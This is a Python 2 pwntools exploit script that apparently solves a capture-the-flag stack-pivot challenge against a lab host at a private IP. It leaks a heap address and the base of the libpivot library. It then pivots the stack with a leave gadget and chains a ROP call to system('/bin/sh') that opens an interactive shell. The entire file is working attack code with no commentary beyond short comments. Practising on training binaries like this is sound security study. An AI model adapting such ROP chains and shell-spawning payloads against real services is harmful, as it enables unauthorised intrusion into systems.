#!/usr/bin/env python2
from pwn import *

# remote connection
p = remote("192.168.56.102", 8888)

# useful address
main = p32(0x0804873b)
puts_plt = p32(0x080485d0)
foothold_got = p32(0x0804a024)
foothold_plt = p32(0x080485f0)

# gadgets
leave = p32(0x0804889e)
pop_ebx = p32(0x08048571)

# Get heap address
leak_addr = p.recvline_contains("The Old Gods").strip().rsplit(' ', 1)[1]
log.info("Leaked heap address is at: " + str(leak_addr))
heap_addr = u32(unhex(leak_addr[2:]), endian='big')

# Stage one: resolve foothold_function address
pay1 = foothold_plt
pay1 += puts_plt
pay1 += main
pay1 += foothold_got # pop foothold_got address into eax
pay1 += "/bin/sh\x00"
pay1 += "A"*271
pay1 += p32(heap_addr-4)
pay1 += leave

p.sendline(pay1)
p.sendline() # We don't need stack smash
foothold_libpivot = u32(p.recvuntil('pivot by')[-13:-9])
next_leak = p.recvline_contains("The Old Gods").strip().rsplit(' ',1)[1]
next_heap_addr = u32(unhex(next_leak[2:]), endian='big')

# Offsets
libpivot_base = foothold_libpivot - 0x770
system = libpivot_base + 0x610
ret2win = libpivot_base + 0x967
ebx_val = libpivot_base + 0x2000
sh_addr = heap_addr + 0x10

# Debugging
log.info("The next leaked heap address is at: 0x%x" % next_heap_addr)
log.info("foothold_plt addr: 0x%x" % foothold_libpivot)
log.info("libpivot_base addr: 0x%x" % libpivot_base)
log.info("System address: 0x%x" % system)
log.info("ebx_val: 0x%xd" % ebx_val)


# Stage two: Spawn shell
pay2 = pop_ebx
pay2 += p32(ebx_val)
pay2 += p32(system)
pay2 += p32(sh_addr)
pay2 += "A"*279
pay2 += p32(next_heap_addr - 4)
pay2 += leave


p.sendline(pay2)
p.sendline() # We don't need stack smash
p.interactive()
